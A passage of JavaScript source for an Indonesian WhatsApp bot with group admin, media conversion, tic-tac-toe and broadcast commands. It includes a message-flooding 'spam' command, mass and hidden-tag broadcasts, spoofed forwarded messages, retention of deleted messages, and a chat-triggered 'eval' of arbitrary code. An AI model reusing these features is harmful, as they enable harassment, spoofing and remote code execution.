                    xznsenpai.FakeStatusForwarded(from, anunya, MessageType.text, fake)
            break
            case 'linkgc':
				    if (!isGroup) return reply("khushus group")
				    if (!isGroupAdmins) return reply("hanya admin bang")
				    if (!isBotGroupAdmins) return reply("Gw Harus Jadi Admin babi")
				    linkgc = await udin.groupInviteCode (from)
				    yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
				    udin.sendMessage(from, yeh, MessageType.text, {quoted: qul})
					break
					case 'listadmin':
					if (!isGroup) return reply("khushus group")
					teeks = `𝗟𝗶𝘀𝘁 𝗮𝗱𝗺𝗶𝗻 𝗼𝗳 𝗴𝗿𝗼𝘂𝗽 *${groupMetadata.subject}*\n𝗧𝗼𝘁𝗮𝗹 : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teeks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teeks, groupAdmins, true)
					break
            //lagu
 case 'iri':
               if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
               const irimp3 = fs.readFileSync('./assets/iri.mp3');
              udin.sendMessage(from, irimp3, MessageType.audio, {quoted: qul, mimetype: 'audio/mp4', duration: 99999999, ptt:true})
              break
              case 'wibu':
              if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
const wibump3 = fs.readFileSync('./assets/wibu.mp3');
udin.sendMessage(from, wibump3, MessageType.audio, {quoted: flokasi, mimetype: 'audio/mp4', duration: 99999999, ptt:true})
break
case 'banjar':
if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
const banjarmp3 = fs.readFileSync('./assets/banjar.mp3');
udin.sendMessage(from, banjarmp3, MessageType.audio, {quoted: flokasi, mimetype: 'audio/mp4', duration: 99999999, ptt:true})
break
/*
case 'dj':
if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
const dj13mp3 = fs.readFileSync('./assets/dj13.mp3');
udin.sendMessage(from, dj13mp3, MessageType.audio, {quoted: dinn, mimetype: 'audio/mp4', duration: 99999999, ptt:true})
break
*/
			case 'togif':
				if (!isQuotedSticker) return reply(from, 'Reply stiker nya', qul)
				if (qul.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
					const encmedia = JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					const media = await udin.downloadAndSaveMediaMessage(encmedia)
					const uploadn = await uptonaufal(media, Date.now() + '.webp')
					const anjj = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${uploadn.result.image}`)
					thumb = await xznsenpai.getBuffer(anjj.data.result)
					xznsenpai.sendGif(from, thumb)
					fs.unlinkSync(media)
				} else {
					xznsenpai.reply(from, `Harus sticker bergerak`, qul)
				}
				break
			case 'toimg': case 'tovideo':
				if (!isQuotedSticker) return xznsenpai.reply(from, 'Reply stiker nya', qul)
				if (qul.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
					const encmedia = JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					const media = await udin.downloadAndSaveMediaMessage(encmedia)
					const uploadn = await uptonaufal(media, Date.now() + '.webp')
					const anjj = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${uploadn.result.image}`)
					await xznsenpai.sendMediaURL(from, anjj.data.result, 'Nih')
					fs.unlinkSync(media)
				} else {
					const encmedia = JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					const media = await udin.downloadAndSaveMediaMessage(encmedia)
					ran = xznsenpai.getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) {
							xznsenpai.reply(from, `gagal`, qul)
							fs.unlinkSync(ran)
						} else {
							buffer = fs.readFileSync(ran)
							xznsenpai.sendImage(from, buffer, 'nih', qul)
							fs.unlinkSync(ran)
						}
					})
				}
				break
			case 'shutdown':
			if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				await xznsenpai.FakeTokoForwarded(from, `Bye...`, fake)
				await xznsenpai.sleep(5000)
				udin.close()
				break
			case 'spam':
				if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}spam teks|jumlahspam`, qul)
				argz = arg.split("|")
				if (!argz) return xznsenpai.reply(from, `Penggunaan ${prefix}spam teks|jumlah`, qul)
				if (isNaN(argz[1])) return xznsenpai.reply(from, `harus berupa angka`, qul)
				for (let i = 0; i < argz[1]; i++){
					xznsenpai.sendText(from, argz[0])
				}
				break
				//group
				case 'delete':
				case 'del':
				case 'd':
				if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
				udin.deleteMessage(from, { id: qul.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }) 
				break
			case 'promote':
			if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
			if (!isBotGroupAdmins) return xznsenpai.reply(from, 'Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini', qul)
				if (qul.message.extendedTextMessage != undefined){
                    mentioned = qul.message.extendedTextMessage.contextInfo.mentionedJid
					await xznsenpai.FakeTokoForwarded(from, `sukses`, fake)
					xznsenpai.promote(from, mentioned)
				} else {
					await xznsenpai.FakeTokoForwarded(from, `sukses`, fake)
					xznsenpai.promote(from, [args[0] + '@s.whatsapp.net'])
				}
				break
			case 'demote':
			if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
			if (!isBotGroupAdmins) return xznsenpai.reply(from, 'Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini', qul)
				if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}demote @tag atau nomor`, qul)
				if (qul.message.extendedTextMessage != undefined){
                    mentioned = qul.message.extendedTextMessage.contextInfo.mentionedJid
					await xznsenpai.FakeTokoForwarded(from, `sukses`, fake)
					xznsenpai.demote(from, mentioned)
				} else {
					await xznsenpai.FakeTokoForwarded(from, `sukses`, fake)
					xznsenpai.demote(from, [args[0] + '@s.whatsapp.net'])
				}
				break
			case 'kick':
			if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
			if (!isBotGroupAdmins) return xznsenpai.reply(from, 'Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini', qul)
				if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}kick @tag atau nomor`, qul)
				if (qul.message.extendedTextMessage != undefined){
                    mentioned = qul.message.extendedTextMessage.contextInfo.mentionedJid
					//await xznsenpai.FakeTokoForwarded(from, `Bye...`, fake)
					reply('Goodby Kawan')
					xznsenpai.kick(from, mentioned)
				} else {
					reply('Goodby Kawan')
					//await xznsenpai.FakeTokoForwarded(from, `Bye...`, fake)
					xznsenpai.kick(from, [args[0] + '@s.whatsapp.net'])
				}
				break
			case 'add':
			if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
			if (!isBotGroupAdmins) return xznsenpai.reply(from, 'Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini', qul)
				if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}kick 628xxxx`, qul)
				xznsenpai.add(from, [args[0] + '@s.whatsapp.net'])
				//xznsenpai.FakeTokoForwarded(from, `Sukses`, fake)
				reply('Sokses lord')
				break
			case 'upstatus':
				if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				if (!arg) return xznsenpai.reply(from, `Penggunaan \n${prefix}upstatus text\n${prefix}upstatus caption <reply atau kirim video / img>`, qul)
				if (isMedia && !qul.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : qul
					const media = await udin.downloadAndSaveMediaMessage(encmedia)
					xznsenpai.upImgStatus(media, arg).then(() => { xznsenpai.FakeTokoForwarded(from, 'Sukses', fake) })
				} else if ((isMedia || isQuotedVideo )) {
					const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : qul
					const media = await udin.downloadAndSaveMediaMessage(encmedia)
					xznsenpai.upVidStatus(media, arg).then(() => { xznsenpai.FakeTokoForwarded(from, 'Sukses', fake) })
				} else {
					await xznsenpai.upTextStatus(arg).then(() => { xznsenpai.FakeTokoForwarded(from, 'Sukses', fake) })
				}
				break
			case 'getgrup': case 'getgroup': case 'getg':
				const ingfo = await xznsenpai.getGroup(totalchat)
				let txt = `Ingfo grup\nJumlah Grup: ${ingfo.length}\n\n`
				for (let i = 0; i < ingfo.length; i++){
					txt += `Nama grup : ${ingfo[i].subject}\nID grup : ${ingfo[i].id}\nDibuat : ${moment(`${ingfo[i].creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\nJumlah Peserta : ${ingfo[i].participants.length}\n\n`
				}
				replyy(txt)
				//xznsenpai.FakeTokoForwarded(from, txt, fake)
				break
			case 'creategrup': case 'creategroup': case 'createg':
			if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				argz = arg.split('|')
				if (qul.message.extendedTextMessage != undefined){
                    mentioned = qul.message.extendedTextMessage.contextInfo.mentionedJid
					udin.groupCreate(argz[0], mentioned)
					.then((res) => xznsenpai.FakeTokoForwarded(from, JSON.stringify(res, null, 2).toString(), fake))
					.catch((err) => console.log(err))
				} else {
					xznsenpai.reply(from, `Penggunaan ${prefix}creategrup namagrup|@tag`, qul)
				}
				break
			case 'imgtourl':
				const encmediiia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : qul
				const mediaq = await udin.downloadMediaMessage(encmediiia)
				const upli = await uptotele(mediaq)
				xznsenpai.reply(from, `${upli}`, qul)
				break
			case 'tourl':
				let a = JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				let b = await udin.downloadAndSaveMediaMessage(a)
				let c = await uploadFile(b)
				xznsenpai.reply(from, c.result, qul)
				fs.unlinkSync(b)
				break
				case 'group':
				if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
				if (!isBotGroupAdmins) return xznsenpai.reply(from, 'Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini', qul)
					if (args[0] === 'buka') {
						udin.groupSettingChange(from, GroupSettingChange.messageSend, false)
						xznsenpai.reply(from, 'Succes Buka Group Lord', qul)
					} else if (args[0] === 'tutup') {
						udin.groupSettingChange(from, GroupSettingChange.messageSend, true)
						xznsenpai.reply(from, 'Succes Tutup Group Lord', qul)
					}
				break 
    case 'clearall':
    if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
					anu = await udin.chats.all()
					udin.setMaxListeners(25)
					for (let _ of anu) {
						udin.deleteChat(_.jid)
					}
					xznsenpai.reply(from, 'Succes Lord', qul)
				break
			case 'antilink':
			if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
			if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
				if (!isBotGroupAdmins) return xznsenpai.reply(from, 'Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini', qul)
					if (Number(args[0]) === 1) {
						if (isAntiLink) return xznsenpai.reply(from, 'sdh aktif', qul)
						antilink.push(from)
						fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
						reply('*❬ 𝗦𝗨𝗞𝗦𝗘𝗦 ❭ ACTIVATED ANTILINK*')
					} else if (Number(args[0]) === 0) {
						antilink.splice(from, 1)
						fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
						reply('*❬ 𝗦𝗨𝗞𝗦𝗘𝗦 ❭ DEACTIVATED ANTILINK*')
					} else {
						
					}
					break	
			case 'welcome':
			if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
			if (!isBotGroupAdmins) return xznsenpai.reply(from, 'Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini', qul)
			//if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
					if (Number(args[0]) === 1) {
						if (isWelkom) return xznsenpai.reply(from, 'sdh aktif', qul)
						welkom.push(from)
						fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
						xznsenpai.reply(from, 'Succes Lord', qul)
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
					   xznsenpai.reply(from, 'Succes Lord', qul)
					} else {
					}
					break 
		    case 'owner':
            case 'creator':
                  udin.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: qul})
                  udin.sendMessage(from, 'Tuh nomer owner ku >_<, ingat utamakan salam',MessageType.text, { quoted: qul} )
					break
      case 'readallchat':
      case 'readall':
      case 'rall':
      if (!isMybot) return xznsenpai.reply(from, 'ONLY MY NUMBER', qul)
      reply(`Succes Membaca ${totalchat.length} Chat`)
				const readallid = await udin.chats.all()
			udin.setMaxListeners(25)
				for (let xyz of readallid) {
					await udin.chatRead(xyz.jid)
				}				
            break
            case 'tagall':
					if (!isGroup) return reply("dalam group")
					if (!isGroupAdmins) return reply("khusus admin anjing")
					members_id = []
					teeks = (args.length > 1) ? body.slice(8).trim() : ''
					teeks += '\n\n'
					for (let mem of groupMembers) {
						teeks += `ꔷ㆒᮫ᨗ᪼᠂⃟🦖 @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teeks, members_id, true)
					break
			case 'bc': 
			if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
					anu = await udin.chats.all()
					if (isMedia && !qul.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo : qul
						buff = await udin.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							udin.sendMessage(_.jid, buff, image, {caption: `❮nXᴢɴ々Bᴏᴛ⸙❯\n\n${body.slice(4)}\n\nnXᴢɴ々Bᴏᴛ⸙`})
						}
						reply('SUKSES')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}\n\nXᴢɴ々Bᴏᴛ⸙`)
						}
						reply('SUKSES ')
					}
					break
					case 'bchide':
					if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
					anu = await udin.chats.all()
                    for (let _ of anu) {
							xznsenpai.hideTag(_.jid, `${arg}`)
						}
						reply('Sokses')
						break
			case 'antidelete':
				if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				const dataRevoke = JSON.parse(fs.readFileSync('./antidelete/gc-revoked.json'))
				const dataCtRevoke = JSON.parse(fs.readFileSync('./antidelete/ct-revoked.json'))
				const dataBanCtRevoke = JSON.parse(fs.readFileSync('./antidelete/ct-revoked-banlist.json'))
				const isRevoke = dataRevoke.includes(from)
				const isCtRevoke = dataCtRevoke.data
				const isBanCtRevoke = dataBanCtRevoke.includes(sender) ? true : false
				if (args.length === 0) return udin.sendMessage(from, `Penggunaan fitur antidelete :\n\n*${prefix}antidelete [aktif/mati]* (Untuk grup)\n*${prefix}antidelete [ctaktif/ctmati]* (untuk semua kontak)\n*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`, MessageType.text)
				if (args[0] == 'aktif') {
					if (isGroup) {
						if (isRevoke) return udin.sendMessage(from, `Antidelete telah diaktifkan di grup ini sebelumnya!`, MessageType.text)
						dataRevoke.push(from)
						fs.writeFileSync('./antidelete/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
						udin.sendMessage(from, `*Succes Enable Antidelete Grup!*`, MessageType.text)
					} else if (!isGroup) {
						udin.sendMessage(from, `Untuk kontak penggunaan *${prefix}antidelete ctaktif*`, MessageType.text)
					}
				} else if (args[0] == 'ctaktif') {
					if (!isGroup) {
						if (isCtRevoke) return udin.sendMessage(from, `Antidelete telah diaktifkan di semua kontak sebelumnya!`, MessageType.text)
						dataCtRevoke.data = true
						fs.writeFileSync('./antidelete/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
						udin.sendMessage(from, `Antidelete diaktifkan disemua kontak!`, MessageType.text)
					} else if (isGroup) {
						udin.sendMessage(from, `Untuk grup penggunaan *${prefix}antidelete aktif*`, MessageType.text)
					}
				} else if (args[0] == 'banct') {
					if (isBanCtRevoke) return udin.sendMessage(from, `kontak ini telah ada di database banlist!`, MessageType.text)
					if (args.length === 1 || args[1].startsWith('0')) return udin.sendMessage(from, `Masukan nomer diawali dengan 62! contoh 62859289xxxxx`, MessageType.text)
					dataBanCtRevoke.push(args[1] + '@s.whatsapp.net')
					fs.writeFileSync('./antidelete/ct-revoked-banlist.json', JSON.stringify(dataBanCtRevoke, null, 2))
					udin.sendMessage(from, `Kontak ${args[1]} telah dimasukan ke banlist antidelete secara permanen!`, MessageType.text)
				} else if (args[0] == 'mati') {
					if (isGroup) {
						const index = dataRevoke.indexOf(from)
						dataRevoke.splice(index, 1)
						fs.writeFileSync('./antidelete/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
						udin.sendMessage(from, `*Succes disable Antidelete Grup!*`, MessageType.text)
					} else if (!isGroup) {
						udin.sendMessage(from, `Untuk kontak penggunaan *${prefix}antidelete ctmati*`, MessageType.text)
					}
				} else if (args[0] == 'ctmati') {
					if (!isGroup) {
						dataCtRevoke.data = false
						fs.writeFileSync('./antidelete/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
						udin.sendMessage(from, `Antidelete dimatikan disemua kontak!`, MessageType.text)
					} else if (isGroup) {
						udin.sendMessage(from, `Untuk grup penggunaan *${prefix}antidelete mati*`, MessageType.text)
					}
				}
				break
			case 'setpp': case 'setprofilepicture':
				if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				if (isMedia && !qul.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(qul).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : qul
					const media = await udin.downloadMediaMessage(encmedia)
					udin.updateProfilePicture(udin.user.jid, media)
					.then((res) => xznsenpai.FakeTokoForwarded(from, JSON.stringify(res, null, 2).toString(), fake))
					.catch((err) => console.log(err))
				} else {
					xznsenpai.reply(from, `Kirim gambar atau reply gambar dengan caption ${prefix}setpp`, qul)
				}
				break
case 'leave':
if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
udin.groupLeave(from)
.then((res) => {
udin.sendMessage(sender, "perintah untuk keluar berhasil di eksekusi", MessageType.text)
})
break
			case 'eval':
			if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
				let code = body.slice(6)
				try {

					if (!code) return xznsenpai.reply(from, 'No JavaScript Code', qul)
					let evaled;

					if (code.includes("--silent") && code.includes("--async")) {
						code = code.replace("--async", "").replace("--silent", "");

						return await eval(`(async () => { ${code} })()`)
					} else if (code.includes("--async")) {
						code = code.replace("--async", "");

						evaled = await eval(`(async () => { ${code} })()`);
					} else if (code.includes("--silent")) {
						code = code.replace("--silent", "");

						return await eval(code);
					} else evaled = await eval(code);

					/*if (typeof evaled !== "string")
						evaled = require("util").inspect(evaled, {
							depth: 0
						*/

					let output = clean(evaled);
					xznsenpai.reply(from, JSON.stringify(evaled, null, 2), qul)

				} catch (err) {
					console.error(err)
					const error = clean(err)
					xznsenpai.reply(from, error, qul)
				}

				function clean(text) {
					if (typeof text === "string")
						return text
							.replace(/`/g, `\`${String.fromCharCode(8203)}`)
							.replace(/@/g, `@${String.fromCharCode(8203)}`);
					// eslint-disable-line prefer-template
					else return text;
				}
				break
case 'ttt':
        case 'tictactoe':
          if (!isGroup) return reply("mainkan di group")
          if (args.length < 1) return reply ("tag orang yang mau kamu aja main")
          if (isTTT) return reply("permainan sedang berlangsung di group ini")
          if (qul.message.extendedTextMessage === undefined || qul.message.extendedTextMessage === null) return reply('Tag salah satu orang untuk di ajak bermain')
          ment = qul.message.extendedTextMessage.contextInfo.mentionedJid;
          player1 = sender
          player2 = ment[0]
          number = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
          id = from
          turn = player2
          roomttt.push({player1,player2,id,number,turn})
          udin.sendMessage(from, `@${player1.split("@")[0]} Telah Memulai Game\n\n*@${player2.split("@")[0]}* anda di tantang untuk bermain game tic tac toe oleh *@${player1.split("@")[0]}*\nketik Y/N untuk menerima/menolak tantangan\n\nketik ${prefix}delttt untuk membatalkan permainan di group ini`, MessageType.text, {contextInfo: {mentionedJid: player2}})
          break;
        case 'delttt':
          if (!isGroup) return reply("command ini hanya untuk group")
          if (!isTTT) return reply("tidak ada permainan yang sedang berlangsung")
          rooms = roomttt.filter(titid => titid.id.includes())
          roomttt = rooms;
          reply("sukses")
          break
			default:
        if (isTTT && isPlayer2) {
        if (chats.startsWith('Y')){
              tto = roomttt.filter(gang => gang.id.includes(from))
              tty = tto[0]
              number = tto[0].number;
              teksboard = `*[ TIC TAC TOE GAME ]*

Player1 @${tty.player1.split('@')[0]}=❌
Player2 @${tty.player2.split('@')[0]}=⭕

${number[1]}${number[2]}${number[3]}
${number[4]}${number[5]}${number[6]}
${number[7]}${number[8]}${number[9]}

giliran = @${tty.player1.split('@')[0]}`
              udin.sendMessage(from, teksboard, MessageType.text, {quoted: qul, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
            }
            //if (budy.startsWith('N')) {
            	if (chats.startsWith('N')){
              tto = roomttt.filter(gang => gang.id.includes(from))
              tty = tto[0]
              rooms = roomttt.filter(tokek => !tokek.id.includes(from))
              roomttt = rooms;
              udin.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:qul,contextInfo:{mentionedJid:[tty.player2]}})
            }
          }
          if (isTTT && isPlayer1) {
            noober = parseInt(budy)
            if (isNaN(noober)) return 
            if (noober < 1 || noober > 9) return reply("masukan number dengan benar")
            main = roomttt.filter(gang => gang.id.includes(from))
            if (!defttt.includes(main[0].number[noober])) return reply("number sudah di isi, pilih number lain nya")
            if (main[0].turn.includes(sender)) return reply("tunggu giliran mu dulu ya")
            s = '❌'
            main[0].number[noober] = s
            main[0].turn = main[0].player1
            rooms = roomttt.filter(bang => !bang.id.includes(from))
            roomttt = rooms;
            pop = main[0]
            roomttt.push(pop)
            tto = roomttt.filter(hgh => hgh.id.includes(from))
            tty = tto[0]
            number = tto[0].number;
            ttt = `${number[1]}${number[2]}${number[3]}\n${number[4]}${number[5]}${number[6]}\n${number[7]}${number[8]}${number[9]}`
            
            winningspeech = () => {
              ucapan1 = `*[ Hasil pertandingan Tic Tac Toe ]*\n\nyeyyy permainan di menangkan oleh *@${tty.player1.split('@')[0]}*\n`
              ucapan2 = `*[ Papan Hasil akhir ]*\n\n${ttt}`
              udin.sendMessage(from, ucapan1, MessageType.text, {quoted:qul, contextInfo:{mentionedJid: [tty.player2]}}) 
              rooms = roomttt.filter(hhg => !hhg.id.includes(from))
              return roomttt = rooms 
            }
            if (number[1] == s && number[2] == s && number[3] == s) return winningspeech()
            
            if (number[1] == s && number[4] == s && number[7] == s) return winningspeech()
            
            if (number[1] == s && number[5] == s && number[9] == s) return winningspeech()
            
            if (number[2] == s && number[5] == s && number[8] == s) return winningspeech()
            
            if (number[4] == s && number[5] == s && number[6] == s) return winningspeech()
            
            if (number[7] == s && number[8] == s && number[9] == s) return winningspeech()
            
            if (number[3] == s && number[5] == s && number[7] == s) return winningspeech()
            
            if (number[3] == s && number[6] == s && number[9] == s) return winningspeech()
            
            if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !ttt.includes('5️⃣') && !ttt.includes('6️⃣') && !ttt.includes('7️⃣') && !ttt.includes('8️⃣') && !ttt.includes('9️⃣')){
              ucapan1 = `*[ Hasil pertandingan Tic Tac Toe ]*\n\npermainan seri Good Game\n`
              ucapan2 = `*[ Papan Hasil akhir ]*\n\n${ttt}`
              reply(ucapan1)
              naa = roomttt.filter(hhg => !hhg.id.includes(from))
              return roomttt= naa
            }
            ucapan = `*[ TIC TAC TOE GAME ]*\n\nPlayer1 @${tty.player1.split('@')[0]}=❌\nPlayer2 @${tty.player2.split('@')[0]}=⭕\n\n${ttt}\n\ngiliran = @${tty.player2.split('@')[0]}`
            udin.sendMessage(from, ucapan, MessageType.text, {quoted: qul, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
          }
          if (isTTT && isPlayer2) {
            noober = parseInt(budy)
            if (isNaN(noober)) return 
            if (noober < 1 || noober > 9) return reply("masukan number dengan benar")
            main = roomttt.filter(gang => gang.id.includes(from))
            if (!defttt.includes(main[0].number[noober])) return reply("number sudah di isi, pilih number lain nya")
            if (main[0].turn.includes(sender)) return reply("tunggu giliran mu dulu ya")
            s = '⭕'
            main[0].number[noober] = s
            main[0].turn = main[0].player2
            rooms = roomttt.filter(bang => !bang.id.includes(from))
            roomttt = rooms;
            pop = main[0]
            roomttt.push(pop)
            tto = roomttt.filter(hgh => hgh.id.includes(from))
            tty = tto[0]
            number = tto[0].number;
            ttt = `${number[1]}${number[2]}${number[3]}\n${number[4]}${number[5]}${number[6]}\n${number[7]}${number[8]}${number[9]}`
            
            winningspeech = () => {
              ucapan1 = `*[ Hasil pertandingan Tic Tac Toe ]*\n\nyeyyy permainan di menangkan oleh *@${tty.player2.split('@')[0]}*\n`
              ucapan2 = `*[ Papan Hasil akhir ]*\n\n${ttt}`
              udin.sendMessage(from, ucapan1, MessageType.text, {quoted:qul, contextInfo:{mentionedJid: [tty.player1]}}) 
              rooms = roomttt.filter(hhg => !hhg.id.includes(from))
              return roomttt = rooms 
            }
            if (number[1] == s && number[2] == s && number[3] == s) return winningspeech()        
            if (number[1] == s && number[4] == s && number[7] == s) return winningspeech()            
            if (number[1] == s && number[5] == s && number[9] == s) return winningspeech()            
            if (number[2] == s && number[5] == s && number[8] == s) return winningspeech()            
            if (number[4] == s && number[5] == s && number[6] == s) return winningspeech()          
            if (number[7] == s && number[8] == s && number[9] == s) return winningspeech()         
            if (number[3] == s && number[5] == s && number[7] == s) return winningspeech()          
            if (number[3] == s && number[6] == s && number[9] == s) return winningspeech()           
            if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !ttt.includes('5️⃣') && !ttt.includes('6️⃣') && !ttt.includes('7️⃣') && !ttt.includes('8️⃣') && !ttt.includes('9️⃣')){
              ucapan1 = `*[ Hasil pertandingan Tic Tac Toe ]*\n\npermainan seri Good Game\n`
              ucapan2 = `*[ Papan Hasil akhir ]*\n\n${ttt}`
              reply(ucapan1)
              naa = roomttt.filter(hhg => !hhg.id.includes(from))
              return roomttt= naa
            }
            ucapan = `*[ TIC TAC TOE GAME ]*\n\nPlayer1 @${tty.player1.split('@')[0]}=❌\nPlayer2 @${tty.player2.split('@')[0]}=⭕\n\n${ttt}\n\ngiliran = @${tty.player1.split('@')[0]}`
            udin.sendMessage(from, ucapan, MessageType.text, {quoted: qul, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
          }
      fin = process.uptime()
        if (!qul.hasNewMessage) return udin.setStatus(`Runtime ${xznsenpai.runtime(fin)} | STATUS : ${public ? 'PUBLIC' : 'SELF'} | prefix ${prefix} | ${xzntes}`)
        qul = qul.messages.all()[0]
				break
        }
        } catch (err) {
        e = String(err)
            if (!e.includes("this.isZero")) {
	console.log(color('[ ERROR ]', 'red'), e)}}})
    //} catch (err) {
        //console.log(color('[ERROR]', 'red'), err)
    //}
//})    


//INI JANGAN DI CUBA KARNA BASE TIDAK SOPORT 

//send 1 button
/*const sendButton = async(content, footer, button1, row1, options = {}) => {
      buttons = [
        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 }
      ]
      buttonMessage = {
        contentText: content,
        footerText: footer,
        buttons: buttons,
        headerType: 1
      }
      await udin.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
    }*/
//send 2 button
/*const send2Button = async(content, footer, button1, row1, button2, row2, options = {}) => {
      buttons = [
        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 },
        { buttonId: row2, buttonText: { displayText: button2 }, type: 1 }
      ]
      buttonMessage = {
        contentText: content,
        footerText: footer,
        buttons: buttons,
        headerType: 1
      }
      await udin.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
    }*/
//send 3 button
/*const send3Button = async(content, footer, button1, row1, button2, row2, button3, row3, options = {}) => {
      buttons = [
        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 },
        { buttonId: row2, buttonText: { displayText: button2 }, type: 1 },
        { buttonId: row3, buttonText: { displayText: button3 }, type: 1 }
      ]
      buttonMessage = {
        contentText: content,
        footerText: footer,
        buttons: buttons,
        headerType: 1
      }
      await udin.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
    }*/
//send gambar + button
/*const sendButtonImg = async(content, url, footer, button1, row1, options = {}) => {
      m = await hexa.prepareMessage(from, await (await fetch(url)).buffer(), MessageType.image)
      buttons = [
        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 }
      ]
      buttonMessage = {
        contentText: content,
        footerText: footer,
        buttons: buttons,
        headerType: 4,
        imageMessage: m.message.imageMessage
      }
      await udin.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
    }*/

/*case 'menu':
